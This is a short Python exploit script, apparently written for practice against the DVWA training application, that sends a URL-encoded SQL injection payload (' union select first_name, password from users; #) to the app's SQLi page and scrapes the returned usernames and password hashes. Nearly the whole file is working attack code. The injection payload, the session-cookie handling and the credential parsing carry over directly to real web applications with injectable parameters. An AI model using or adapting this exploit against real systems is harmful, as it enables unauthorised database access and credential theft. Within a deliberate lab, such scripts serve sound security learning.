#!/usr/bin/env python

import requests
import sys
import getopt
import urllib
import re

# un_parsed: PHPSESSID=u5s93of6f7jqcnqlf60auoka02; security=low
def parse_cookie(un_parsed):
	cookies = dict()

	ind_cookies = [x.strip().split("=") for x in un_parsed.split(";")]
	for key, val in ind_cookies:
		cookies[key] = val

	return cookies

# print usage
def usage(exit_status=0):
	print(f"{sys.argv[0]} [-h|--host| <host> [-c|--cookies] <cookie1; cookie2>")
	sys.exit(exit_status)


def main():
	host = "localhost:8080"
	cookies = dict()


	# ./sploit.py [-h|--host\ <host> [-c|--cookies] <cookie1; cookie2>
	try:
		opts, argv = getopt.getopt(sys.argv[1:], "h:c:", ["host=", "cookies="])

		# extracting the arguments
		for opt, val in opts:
			if opt in ('-c', '--cookies'):
				cookies = parse_cookie(val)

			if opt in ('-h', '--host'):
				host = val
	except getopt.GetoptError as gerr:
		print(gerr)
		usage()

	# the payload
	payload = """' union select first_name, password from users; #"""
	# url encode it
	payload = urllib.parse.quote(payload) 

	url = f"http://{host}/vulnerabilities/sqli/?id={payload}&Submit=Submit"
	r = requests.get(url, cookies=cookies)

	# please don't do this
	# terrible code coming up
	result_block = re.search("<pre>(.*)</pre>", r.text)[0]
	creds = dict()
	x = result_block.split("ID: ' union select first_name, password from users; #<br />First name: ")
	for i in x:
		if "<br />Surname: " in i:
			key = i.split("<br />Surname: ")[0]
			val = i.split("<br />Surname: ")[1].split("</pre>")[0]
			creds[key] = val
			print(f"{val}:{key}")

	

if __name__ == "__main__":
	main();